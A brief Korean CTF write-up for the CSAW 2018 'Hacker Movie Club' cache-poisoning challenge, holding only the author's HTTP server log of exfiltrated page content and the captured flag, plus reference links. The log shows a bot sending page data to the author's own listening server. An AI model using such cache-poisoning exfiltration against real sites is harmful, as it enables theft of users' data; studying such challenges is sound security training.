# CSAW CTF 2018 Quals

## Problem

- Hacker Movie Club - web / Cache Poisoning
- Oauth2 - web / oauth2 / 

## Hacker Movie Club

### Description

N/A

### Exploit

Cache Poisoning 문제였는데, 문제 풀고 따로 정리를 안해놓았다.

남아있는건 아래의 로그뿐...

```
root@vultr:/tmp/xss# python -m SimpleHTTPServer 10101
Serving HTTP on 0.0.0.0 port 10101 ...
211.236.165.193 - - [18/Sep/2018 17:04:45] code 404, message File not found
211.236.165.193 - - [18/Sep/2018 17:04:45] "GET /WarGamesKung%20FurySneakersSwordfishThe%20Karate%20KidGhost%20in%20the%20ShellSerial%20Experiments%20LainThe%20MatrixBlade%20RunnerBlade%20Runner%202049HackersTRONTron:%20LegacyMinority%20ReporteXistenZ[REDACTED] HTTP/1.1" 404 -
216.165.2.32 - - [18/Sep/2018 17:04:53] code 404, message File not found
216.165.2.32 - - [18/Sep/2018 17:04:53] "GET /WarGamesKung%20FurySneakersSwordfishThe%20Karate%20KidGhost%20in%20the%20ShellSerial%20Experiments%20LainThe%20MatrixBlade%20RunnerBlade%20Runner%202049HackersTRONTron:%20LegacyMinority%20ReporteXistenZflag%7BI_h0pe_you_w4tch3d_a11_th3_m0v1es%7D HTTP/1.1" 404 -
```

**flag{I_h0pe_you_w4tch3d_a11_th3_m0v1es}**



### Reference

https://www.youtube.com/watch?v=mroq9eHFOIU

https://docs.acquia.com/acquia-cloud/performance/varnish/headers/

https://portswigger.net/blog/practical-web-cache-poisoning

https://portswigger.net/kb/papers/7q1e9u9a/web-cache-poisoning.pdf

